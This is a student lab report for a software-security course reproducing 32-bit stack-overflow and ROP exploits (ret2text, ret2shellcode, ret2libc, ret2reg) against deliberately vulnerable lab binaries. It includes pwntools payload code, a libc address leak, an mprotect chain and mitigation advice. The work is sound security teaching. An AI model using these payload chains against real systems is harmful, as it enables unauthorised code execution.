# 《软件与系统安全》实验 2A：栈溢出与 ROP 利用

姓名：方炳懿　学号：202628010829033　日期：2026 年 11 月 26 日

## 1 实验环境与提交物

实验在 Ubuntu 22.04 LTS（x86_64，开启 i386 多架构支持）中完成，内核 6.5。工具链为 gcc 11.4（-m32）、gdb、python3 + pwntools 4.15、ROPgadget 7.7、Capstone。

为便于观察栈地址，ret2shellcode 实验时关闭了 ASLR（/proc/sys/kernel/randomize_va_space=0），其余实验保持系统默认。

提交物：源码与 exp 位于 GitHub 仓库 https://github.com/bubulele/ucas 的 EX2A/ 目录；本报告为实验文档；演示视频为 EX2A_play.mp4（静音）。

## 2 漏洞原理

### 2.1 栈溢出与返回地址劫持

x86 32 位下函数调用由 CALL 压入返回地址，被调函数用 push ebp; mov ebp,esp; sub esp,N 建立栈帧；函数返回时 leave; ret 恢复栈并弹出返回地址。若程序用 gets 等无边界函数把用户输入写入栈上固定缓冲区，超长输入会依次覆盖局部变量、保存的 EBP 和返回地址，ret 时 EIP 即被劫持。

本实验的 6 个程序均以 gets(buf) 为入口，buf 距返回地址的偏移固定为 112 字节，exp 中统一用 b'A'*112 填充。

### 2.2 ROP 与 NX

NX（Linux）/DEP（Windows）使栈不可执行，直接跳 shellcode 会触发 SIGSEGV。ROP 的思路是复用代码段中已有的、以 ret 结尾的指令片段（gadget），拼出任意逻辑：布置寄存器、调用函数、跳转。

32 位 Linux 的 cdecl 调用约定通过栈传参：调用 func(a) 时栈上依次是返回地址和参数 a。因此 ROP 链就是把“函数地址 + 占位返回地址 + 参数”按顺序摆在栈上。

### 2.3 PLT/GOT 与信息泄露

动态链接程序中，call printf 实际跳到 printf@plt，PLT 再通过 GOT 中的函数指针跳转。GOT 在运行时被填成 libc 的真实地址，因此泄露某个 GOT 项（如 puts@got）即可算出 libc 基址：base = leak - libc.symbols['puts']，进而得到 system 与 /bin/sh 的真实地址。

## 3 五类 ROP 利用的复现

### 3.1 ret2text

防护：NX 开启、无 PIE、无 Canary。程序内存在 secure() 函数，内部调用 system("/bin/sh")。

利用：把返回地址覆盖为 secure 的地址即可。偏移 112，secure = 0x8049186。

    payload = b'A'*112 + p32(e.symbols['secure'])
    io = process(BIN); io.sendline(payload)
    io.sendline(b'echo PWNED; id; exit')

运行结果：PWNED_RET2TEXT，uid=1000(fff) gid=1000(fff)。

### 3.2 ret2shellcode

防护：栈可执行（-z execstack），无 PIE、无 Canary。程序内没有 system，也没有 /bin/sh。

利用：把 shellcraft.sh() 生成的 shellcode 放在缓冲区开头，后面用 NOP 填充到偏移 112，返回地址写缓冲区地址。

难点：关闭 ASLR 后栈地址仍会随 argv[0] 与环境变量长度变化。因此 exp 采用 NOP 雪橇（68 字节）加小范围地址枚举：在 0xffffd800 至 0xffffe000 间按 0x40 步进尝试，命中后输出 HIT_<addr>。

    shell = asm(shellcraft.sh())
    for base in range(0xffffd800, 0xffffe000, 0x40):
        payload = shell.ljust(112, b'\x90') + p32(base)
        ...  # 发送并检查输出是否含 HIT_

运行结果：BUF 约为 0xffffdd7c，PWNED_SHELLCODE，uid=1000(fff)。

### 3.3 ret2libc1

防护：NX 开启、无 PIE。程序内有 system@plt，也有 /bin/sh 字符串。

利用：链为 system@plt、占位返回地址、/bin/sh 地址，即 ret 到 system 后，system 从 [esp+4] 取参数。

    system = e.plt['system']; binsh = next(e.search(b'/bin/sh'))
    payload = b'A'*112 + p32(system) + p32(0) + p32(binsh)

运行结果：PWNED_LIBC1，uid=1000(fff)。

### 3.4 ret2libc3

防护：NX 开启、无 PIE；程序内既无 system 也无 /bin/sh，但调用了 puts，存在 puts@plt 与 puts@got。

利用：第一次溢出泄露 puts@got（ret 到 puts，返回地址设为 main 以便再次利用），据 libc 中 puts 的偏移算出基址；第二次溢出调用 system('/bin/sh')。

    payload1 = b'A'*112 + p32(puts) + p32(main) + p32(puts_got)
    leak = int.from_bytes(io.recvline().strip()[:4].ljust(4,b'\x00'),'little')
    base = leak - libc.symbols['puts']
    payload2 = b'A'*112 + p32(base+libc.symbols['system']) + p32(0) \
             + p32(base+next(libc.search(b'/bin/sh')))

运行结果：leak=0xf7c72810，base=0xf7c00000，PWNED_LIBC3，uid=1000(fff)。

### 3.5 ret2reg（CTF-wiki 中级 ROP）

见第 4 章。

## 4 中级 ROP 专题：ret2reg

### 4.1 背景与原理

ret2reg 属于 CTF-wiki 中级 ROP 中的一类：当某个寄存器在函数返回时恰好指向我们可控的缓冲区时，不需要知道缓冲区的绝对地址，只要把返回地址覆盖为一条“跳转到该寄存器”的指令（如 jmp eax 或 call eax），就能直接执行缓冲区中的内容。

它的价值在于绕开栈地址随机化：ret2shellcode 需要事先知道 buf 地址，而 ret2reg 利用的是寄存器里已经存在的地址，地址由程序自己算好，攻击者无需猜测。

本实验选用 gets 作为触发点：gets 的返回值就是缓冲区首地址，函数返回时 EAX 仍保存该值，因此 ret 到 call eax 即可跳到 buf 开头。

### 4.2 目标程序与防护

目标程序与 ret2shellcode 相同（gets 加栈可执行），编译命令为 gcc -m32 -fno-stack-protector -no-pie -z execstack -o ret2shellcode ret2shellcode.c。

checksec 结果：NX enabled on new kernels（栈被显式标为可执行）、No PIE、No canary。因为栈可执行，ret2reg 跳过去即可直接执行 shellcode；若栈不可执行，则需要先 mprotect 或改用 ret2libc 系列。

### 4.3 gadget 搜索

用 Capstone 遍历 .text 段，寻找 call eax（字节 FF D0）或 jmp eax（FF E0）。本例在 0x80490e0 找到 call eax。

    md = Cs(CS_ARCH_X86, CS_MODE_32)
    for ins in md.disasm(e.read(text.sh_addr, text.sh_size), text.sh_addr):
        if ins.mnemonic == 'call' and ins.op_str == 'eax':
            call_eax = ins.address; break
    # call eax = 0x80490e0

若目标程序中没有 call eax，也可以寻找 call/jmp 其他寄存器（如 esi、edi），或在 libc 中找对应 gadget 并配合基址使用。

### 4.4 利用过程与 exp

payload 结构为：shellcode（44 字节）、NOP 填充到 112 字节、call eax 地址。gets 读入后返回，EAX=buf，vuln 的 leave; ret 弹出我们覆盖的返回地址 0x80490e0，call eax 跳回 buf 执行 shellcode。

    shell = asm(shellcraft.sh())
    payload = shell.ljust(112, b'\x90') + p32(call_eax)
    io = process(BIN, env={})
    io.sendline(payload)
    io.sendline(b'echo PWNED_RET2REG; id; exit')

运行结果：call eax = 0x80490e0，PWNED_RET2REG，uid=1000(fff)。

### 4.5 与 ret2shellcode 的对比

ret2shellcode 需要预先知道缓冲区地址，受 argv/env 影响，换个路径就可能失效；ret2reg 只依赖“函数返回时寄存器指向缓冲区”这一程序行为，不依赖绝对地址，稳定性更好。

代价是 ret2reg 需要额外的 gadget（call/jmp reg），且要求缓冲区所在内存可执行；在 NX 强制开启的现代系统上，ret2reg 往往需要与 mprotect/ROP 结合才能奏效。

### 4.6 调试与验证

先在 gdb 中确认 gets 返回后 EAX 的值：在 vuln 的 ret 处下断点，运行并输入 112 字节的测试串，执行 x/wx $eax，可以看到 EAX 正好等于 buf 的首地址；再单步执行 ret，EIP 落到 0x80490e0 的 call eax，随后 EIP 变为 buf 地址，证明控制流确实交给了寄存器。

    (gdb) b *0x80491d8      # vuln 的 ret
    (gdb) r < /tmp/in.bin
    (gdb) x/wx $eax         # 0xffffdd7c，即 buf
    (gdb) si                # 进入 call eax，EIP=0x80490e0
    (gdb) si                # EIP=buf 地址

这一步也解释了为什么 ret2reg 不需要知道 buf 的绝对地址：地址在运行时由 gets 的返回值给出，攻击者只是在返回地址处借用了它。

### 4.7 失败尝试：固定地址方案为何不稳定

最初采用 ret2shellcode 的固定地址写法，把 BUF 硬编码为测量值。实测发现：在同一个 exp 目录下用 python3 直接运行可以成功，但在桌面终端（xterm）里运行同样的脚本却失败。原因是栈地址不仅受 ASLR 影响，还受 argv[0] 的写法和环境变量长度影响。

    env -i /home/fff/ex2a_repo/EX2A/src/ret2shellcode   # BUF = 0xffffdd7c
    cd exp && python3 ret2shellcode.py                  # 同一二进制，BUF 可能偏移

因此最终把 ret2shellcode 改为 NOP 雪橇加小范围枚举；而 ret2reg 从原理上就不依赖这个地址，正好绕开了这类问题。这个对比也说明：ROP 利用中地址来源比地址数值更重要。

### 4.8 防护变体下的改造

如果目标开启了 NX（栈不可执行），单纯的 call eax 跳过去会触发 SIGSEGV，此时可以把链改成先 mprotect(buf_page, 0x1000, PROT_READ|WRITE|EXEC) 再跳 buf。

    payload = b'A'*112 + p32(mprotect) + p32(call_eax) \
            + p32(buf_page) + p32(0x1000) + p32(7)

其中 buf_page 需要 4KB 对齐，call_eax 作为 mprotect 的返回地址，mprotect 返回后跳到 buf 执行 shellcode。若连 mprotect 都无法调用，则退化为 ret2libc：泄露 libc 基址后直接 system('/bin/sh')。

如果程序是 PIE，还需要先泄露代码段基址才能定位 call eax；如果只有 jmp esi/edi 等其它寄存器可用，则需要在链上先把 buf 地址弹入对应寄存器（如 pop esi; ret 后跟 buf 地址）。

### 4.9 适用场景与局限

ret2reg 适用于“函数返回时某寄存器仍指向可控缓冲区”的程序，常见于 gets/strcpy 这类返回缓冲区指针的库函数之后。它的优点是地址自给自足、不依赖 ASLR 的随机化结果；局限是必须有可用寄存器跳转 gadget，且目标内存可执行，或者愿意额外付出 mprotect 的成本。

在真实漏洞利用中，ret2reg 往往作为栈迁移或 JOP 的入口使用：先用寄存器跳转把控制流引到可控区域，再在该区域布置完整的 ROP 链。理解这一点，对后续学习 SROP、ret2dlresolve 等高级技巧很有帮助。

## 5 难点与总结

（1）偏移的确定。用 cyclic 模式填充并观察崩溃时的 EIP，反查偏移；6 个程序的 buf 偏移一致（112），但编译选项（PIE、canary）会改变偏移，需逐题确认。

（2）ret2shellcode 的地址问题。关闭 ASLR 后栈地址仍受 argv/env 影响，固定地址在不同路径或终端下会失效；最终用 NOP 雪橇加小范围枚举解决，这也是 ret2reg 相对更稳的原因。

（3）cdecl 传参。ret 到 system 时，参数在 [esp+4]，返回地址占位不能省；链中每个函数的参数与返回地址必须严格对齐。

（4）ret2libc3 的两次利用。第一次泄露后必须让程序回到 main（或 _start）才能第二次溢出；libc 版本必须与运行环境一致，否则偏移算错。

（5）PLT/GOT 的理解。ret2libc1 与 ret2libc3 的差别就在于程序里有没有 system、有没有 /bin/sh、能不能泄露；理解 GOT 的填充时机是解题关键。

## 6 防范方法

开发阶段：禁用 gets、strcpy、sprintf 等无边界函数，改用 fgets、strncpy、snprintf 并做长度校验；开启 -fstack-protector（Canary）、-D_FORTIFY_SOURCE、-Wl,-z,relro,-z,now（Full RELRO）、-fPIE -pie（PIE）。

运行阶段：开启 NX 与 ASLR（randomize_va_space=2），必要时启用 SELinux/AppArmor 限制进程；对必须处理不可信输入的程序使用沙箱或 seccomp。

运维阶段：及时更新 libc 与第三方库，避免使用过旧的发行版；对暴露在外的服务做输入长度与异常模式检测，并限制可执行内存。

## 7 仓库与提交说明

代码仓库：https://github.com/bubulele/ucas（EX2A/ 目录），提交记录包含环境搭建、6 个演示程序、5 个 exp 与说明文档。

本地验证环境：Ubuntu 22.04 + gcc-multilib + pwntools；运行方式见 EX2A/README.md：先编译 src 下程序，再在 exp 目录执行对应脚本。
